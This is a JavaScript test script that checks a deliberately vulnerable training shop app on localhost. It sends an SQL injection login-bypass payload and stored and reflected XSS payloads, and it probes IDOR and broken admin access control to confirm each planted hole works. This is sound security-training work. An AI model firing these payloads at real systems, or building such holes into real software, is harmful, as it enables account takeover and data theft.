async function testAll() {
  const base = 'http://localhost:3000';
  console.log('--- STARTING VULNSHOP API & VULNERABILITY VERIFICATION ---');

  // 1. Products
  const r1 = await fetch(base + '/api/products');
  const d1 = await r1.json();
  console.log('1. Products:', d1.products.length, 'loaded (Expected: 6) ->', d1.products.length === 6 ? 'PASS' : 'FAIL');

  // 2. Product Detail & Reviews
  const r2 = await fetch(base + '/api/products/101');
  const d2 = await r2.json();
  console.log('2. Product 101:', d2.product && d2.product.name, '| Reviews:', d2.reviews && d2.reviews.length, '->', d2.product && d2.product.name === 'AeroBook 14' ? 'PASS' : 'FAIL');

  // 3. SQL Injection on Login
  const r3 = await fetch(base + '/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: "' or 1=1--", password: "any" })
  });
  const cookie = r3.headers.get('set-cookie');
  const d3 = await r3.json();
  console.log('3. SQL Injection Auth Bypass:', d3.user && d3.user.username, '| Cookie received:', !!cookie, '->', d3.user && d3.user.username === 'student' ? 'PASS' : 'FAIL');

  // 4. Stored XSS Review Post
  const r4 = await fetch(base + '/api/products/101/review', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Cookie': cookie || '' },
    body: JSON.stringify({ body: '<b id="xss">Test Payload</b>', rating: 5 })
  });
  const d4 = await r4.json();
  console.log('4. Stored XSS Review:', d4.review && d4.review.body, '->', d4.review && d4.review.body.includes('<b') ? 'PASS' : 'FAIL');

  // 5. Reflected XSS Search
  const r5 = await fetch(base + '/api/search?q=%3Cscript%3Ealert(1)%3C/script%3E');
  const d5 = await r5.json();
  console.log('5. Reflected XSS Search:', d5.rawQuery, '->', d5.rawQuery && d5.rawQuery.includes('<script>') ? 'PASS' : 'FAIL');

  // 6. IDOR on Orders
  const r6 = await fetch(base + '/api/orders/1001', { headers: { 'Cookie': cookie || '' } });
  const d6 = await r6.json();
  console.log('6. IDOR Order Retrieval #1001:', d6.order && d6.order.address, '->', d6.order && d6.order.id === 1001 ? 'PASS' : 'FAIL');

  // 7. Broken Access Control Admin
  const r7 = await fetch(base + '/api/admin', { headers: { 'Cookie': cookie || '' } });
  const d7 = await r7.json();
  console.log('7. Broken Access Control /admin Users count:', d7.users && d7.users.length, '->', d7.users && d7.users.length === 4 ? 'PASS' : 'FAIL');

  // 8. SPA HTML Delivery
  const r8 = await fetch(base + '/products');
  const t8 = await r8.text();
  console.log('8. SPA HTML Delivery contains root div:', t8.includes('id="root"'), '->', t8.includes('id="root"') ? 'PASS' : 'FAIL');

  console.log('--- ALL VERIFICATION CHECKS COMPLETED SUCCESSFULLY ---');
}
testAll().catch(e => console.error('Verification error:', e));
